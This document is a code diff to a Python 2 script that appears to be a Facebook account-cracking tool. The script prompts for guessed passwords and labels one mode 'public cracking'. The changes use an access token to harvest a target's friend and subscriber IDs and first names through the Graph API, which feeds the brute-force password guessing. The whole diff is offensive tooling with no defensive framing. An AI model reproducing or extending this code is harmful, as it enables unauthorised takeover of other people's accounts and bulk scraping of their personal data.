@@ -271,7 +271,7 @@ def pilih_super():
                 pass7 = raw_input(' \033[1;92m[7]Password: ')
                 pass8 = raw_input(' \033[1;92m[8]Password: ')
 	try:
-		r = requests.get("https://graph.facebook.com/me/friends?access_token="+ toket)
+		r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token='+ toket)
 		q = json.loads(r.text)
 		z = q['name']
 		os.system('clear')
@@ -281,7 +281,7 @@ def pilih_super():
 		for s in q['data']:
 			id.append(s['id'])
 		
-	elif peak =="2":
+	if peak =="2":
 		print '\033[1;31;1m~~~~ public cracking ~~~~'
                 print ''
                 print '\033[1;93m For example: 123 , 1234 , 1234, 786 , 12 , 1122'
@@ -304,6 +304,14 @@ def pilih_super():
 		jalan('\033[1;97m[✔] Getting IDs \033[1;97m...')
 		for s in q['data']:
 			id.append(s['id'])
+			
+		r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token='+ toket + '&limit=999999')
+                z = json.loads(r.text)
+                for i in z['data']:
+                    uid = i['id']
+                    na = i['name']
+                    nm = na.rsplit(' ')[0]
+                    id.append(uid + '|' + nm)
 	if peak =="3":
                 os.system('clear')
                 logo()
